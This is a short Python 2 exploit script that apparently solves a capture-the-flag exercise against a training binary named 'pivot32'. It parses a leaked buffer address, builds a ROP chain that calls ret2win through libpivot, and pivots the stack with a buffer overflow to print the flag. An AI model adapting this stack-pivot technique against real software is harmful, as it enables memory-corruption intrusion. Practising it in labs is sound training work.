#!/usr/bin/python

import struct
from subprocess import PIPE, Popen

# ToDo: pwnlib contains lots of functionality
#	that will replace hard coded values and
#	functionality

foothold_offset = 0x770;
ret2win_offset = 0x967;
difference = ret2win_offset - foothold_offset;

process = Popen('./pivot32', stdout=PIPE, stdin=PIPE, stderr=PIPE);

# eat first five lines
for i in range(0, 4):
	process.stdout.readline()

# line six contains generous buffer location
loc = process.stdout.readline()
pivot_loc = int(loc.split()[11], 16)

print "[+] Pivot location: " + str(hex(pivot_loc))

rop = struct.pack('<I', 0x80485f0);	# call foothold for access to libpivot
rop += struct.pack('<I', 0x80488c0);	# pop eax
rop += struct.pack('<I', 0x804a024);	# popped into eax
rop += struct.pack('<I', 0x80488c4);	# mov eax, dword ptr [eax]
rop += struct.pack('<I', 0x8048571);	# pop ebx
rop += struct.pack('<I', difference);	# offset between ret2win and foothold
rop += struct.pack('<I', 0x80488c7);	# add eax, ebx
rop += struct.pack('<I', 0x80486a3);	# call eax

rop += "\n"
rop += "A"*44
rop += struct.pack('<I', 0x80488c0);	# pop eax
rop += struct.pack('<I', pivot_loc);	# popped into eax
rop += struct.pack('<I', 0x80488c2);	# xchg eax, esp

# print that flag
print process.communicate(rop)[0].decode()
